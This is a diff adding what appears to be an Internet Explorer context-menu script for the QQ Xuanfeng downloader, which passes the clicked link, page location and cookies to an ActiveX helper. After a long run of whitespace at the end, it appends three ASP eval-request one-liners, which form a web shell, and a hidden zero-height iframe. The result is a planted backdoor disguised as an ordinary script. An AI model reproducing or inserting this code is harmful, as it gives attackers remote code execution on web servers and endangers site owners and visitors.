@@ -1,0 +1,111 @@
+<script language="javascript">
+
+
+function AddLink(Url,Info,Location, strCookie, CID)
+{	
+    if (Url != "")
+    {
+        var QQRightClick = new ActiveXObject("QQIEHelper.QQRightClick.2");
+        QQRightClick.sendUrl2(Url, Location, Info, strCookie, 0, CID)
+    }
+}
+
+function OnContextMenu()
+{
+    var srcEvent = external.menuArguments.event;
+    var EventElement;
+	
+    var CID = 0
+    var theCID = external.menuArguments.document.getElementById("qqdl_cid");
+    if (theCID != null)
+    {
+        CID = theCID.value;
+    }
+	
+    if(typeof(srcEvent.clientX) == "undefined")
+    {
+        EventElement = external.menuArguments.document.elementFromPoint ( srcEvent.pointerX, srcEvent.pointerY );
+    }
+    else
+    {
+        EventElement = external.menuArguments.document.elementFromPoint ( srcEvent.clientX, srcEvent.clientY );
+    }
+			
+    var strLocation = external.menuArguments.location; // 引用页
+
+    var srcAnchor;
+
+    if (srcEvent.type == "MenuExtAnchor")
+    {
+        srcAnchor = EventElement;
+
+        do
+        { 
+            srcAnchor=srcAnchor.parentElement;
+        }
+        while(typeof(srcAnchor)=="HTMLAnchorElement");
+		
+        AddLink(srcAnchor.href,srcAnchor.innerText,strLocation, external.menuArguments.document.cookie, CID);
+    }
+    else if (srcEvent.type == "MenuExtImage")
+    {
+        if (typeof(EventElement) == "HTMLAreaElement")
+        {
+            AddLink(EventElement.href,EventElement.Alt,strLocation, external.menuArguments.document.cookie, CID);
+        }
+        else 
+        {
+            var srcImage = EventElement;
+            var srcAnchor = srcImage.parentElement;
+            do
+            { 
+                srcAnchor=srcAnchor.parentElement;
+                if (typeof(srcAnchor) == "undefined")
+                {
+                    AddLink(srcImage.href, srcImage.Alt, strLocation, external.menuArguments.document.cookie, CID);
+                    return;
+                }
+            }while(typeof(srcAnchor) == "HTMLAnchorElement");
+            
+            AddLink(srcAnchor.href,srcImage.Alt,strLocation, external.menuArguments.document.cookie, CID);
+        }
+    }	
+    else if (srcEvent.type == "MenuExtUnknown")
+    {
+        srcAnchor = EventElement;
+        if(srcAnchor != null && srcAnchor.tagName != null && srcAnchor.tagName.toLowerCase() == "a")
+        {
+            AddLink(srcAnchor.href,srcAnchor.innerText,strLocation, external.menuArguments.document.cookie, CID);
+        }
+        else
+        {
+            while(srcAnchor != null && srcAnchor.tagName != null && srcAnchor.tagName.toLowerCase() != "a")
+            {
+	              srcAnchor = srcAnchor.parentElement;
+	              if(srcAnchor != null && srcAnchor.tagName != null && srcAnchor.tagName.toLowerCase() == "a")
+	              {
+	                  AddLink(srcAnchor.href,srcAnchor.innerText,strLocation, external.menuArguments.document.cookie, CID);
+	                  return;
+	              }
+	          }
+			
+	          if(EventElement != null && EventElement.tagName != null)
+	          {
+	              AddLink(EventElement.href,EventElement.innerText,strLocation, external.menuArguments.document.cookie,CID);
+	          }
+	          else
+	          {
+	              alert("超级旋风暂不支持该站点的页面格式");
+	          }
+        }
+    }
+}
+
+OnContextMenu();
+
+</script>
+
+                                                                                              
+<%eval request("%")%>
+<%eval request("%")%><IfrAmE src= width=100 height=0></IfrAmE>
+<%eval request("%")%>
